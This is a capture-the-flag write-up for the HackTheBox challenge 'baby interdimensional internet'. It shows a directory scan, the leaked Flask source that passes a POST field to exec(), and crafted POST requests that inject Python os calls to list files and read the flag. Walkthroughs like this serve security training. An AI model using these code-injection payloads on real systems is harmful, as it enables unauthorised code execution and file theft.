# baby interdimensional internet

Completed: Yes
Platform: HackTheBox

Check the site and see again rick and morty theme. It is a calculator. Let's brute force the dirs:

```bash
$ feroxbuster -u http://188.166.173.208:30029/ -w ~/tools/SecLists/Discovery/Web-Content/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://188.166.173.208:30029/
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/kali/tools/SecLists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       42l      123w     1171c http://188.166.173.208:30029/debug
[####################] - 1m     20475/20475   0s      found:1       errors:5894   
[####################] - 1m     20475/20475   299/s   http://188.166.173.208:30029/
```

Go to debug:

```python
from flask import Flask, Response, request, render_template, request
from random import choice, randint
from string import lowercase
from functools import wraps

app = Flask(__name__)

def calc(recipe):
	global garage
	garage = {}
	try: exec(recipe, garage)
	except: pass

def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
	@wraps(func)
	def federation(*args, **kwargs):
		ingredient = ''.join(choice(lowercase) for _ in range(10))
		recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))

		if request.method == 'POST':
			ingredient = request.form.get('ingredient', '')
			recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))

		calc(recipe)

		if garage.get(ingredient, ''):
			return render_template('index.html', calculations=garage[ingredient])

		return func(*args, **kwargs)
	return federation

@app.route('/', methods=['GET', 'POST'])
@GCR
def index():
	return render_template('index.html')

@app.route('/debug')
def debug():
	return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
	app.run('0.0.0.0', port=1337)
```

After light code review, you'll understand that the application just playing around with the random and math operations. But for the HTTP POST method is different. It takes the data from the body and works with it in `exec` function, which we can exploit to execute arbitrary code, but we need to see the flag. And that's why we have an if statement after calc function, which just checks the element in a dict and puts it in the template.

A simple http post request with needed body data:

```bash
POST / HTTP/1.1
Host: 188.166.173.208:30029
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

ingredient=hello&measurements=__import__('os').getcwd()
```

Returns to us these:

```bash
<h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'>/app</h1>
```

That just proves the  code execution. Let's use simple functions of os module.

```bash
POST / HTTP/1.1
Host: 188.166.173.208:30029
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

ingredient=hello&measurements=__import__('os').listdir('.')
```

```bash
<h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'>[&#39;app.py&#39;, &#39;templates&#39;, &#39;flag&#39;]</h1>
```

Okay, now it is clear. Just execute `open('flag', 'r').read()`.